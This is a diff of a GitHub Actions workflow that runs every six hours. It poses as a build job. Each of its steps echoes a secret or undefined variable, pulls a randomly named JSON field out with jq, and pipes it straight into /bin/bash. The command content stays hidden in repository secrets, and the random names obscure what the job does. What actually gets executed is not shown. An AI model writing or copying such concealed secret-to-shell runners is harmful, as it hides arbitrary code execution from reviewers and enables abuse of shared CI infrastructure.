@@ -2,31 +2,21 @@ name: clowderajar
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 0/6 * * *'
-jobs:  # 8962
+    - cron: '45 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: clowderajar
         env:
-          ref92: ${{ secrets.ref92 }}
+          sss684: ${{ secrets.sss684 }}
         run: |
-          echo $ref92 | jq -r .zwjcm13149 | /bin/bash
-          echo $j2335 | jq -r .bj44 | /bin/bash
-          echo $d7183 | jq -r .yola988 | /bin/bash
-          echo $vmqzl67 | jq -r .kc8 | /bin/bash
-          echo $jydwg4 | jq -r .sosn399 | /bin/bash
-          echo $nfx5 | jq -r .he459 | /bin/bash
-          echo $eetqi95031 | jq -r .vig192 | /bin/bash
-          echo $gwo871 | jq -r .kvb5991 | /bin/bash
-          echo $xcwu28972 | jq -r .l78300 | /bin/bash
-          echo $axqie4 | jq -r .dy39 | /bin/bash
-          echo $blwnd9 | jq -r .gbawa94 | /bin/bash
-          echo $pdvx6 | jq -r .jz0 | /bin/bash
-          echo $oulh393 | jq -r .baa858 | /bin/bash
-          echo $jg282 | jq -r .zvx130 | /bin/bash
-          echo $x151 | jq -r .rvhp688 | /bin/bash
-          echo $lza11031 | jq -r .yax351 | /bin/bash
-          echo $bn6 | jq -r .oirh991 | /bin/bash
+          echo $sss684 | jq -r .puss825 | /bin/bash
+          echo $az54557 | jq -r .wydyv120 | /bin/bash
+          echo $jovo55212 | jq -r .ogv61 | /bin/bash
+          echo $rpqy77836 | jq -r .zr406 | /bin/bash
+          echo $z1700 | jq -r .eevy2 | /bin/bash
 
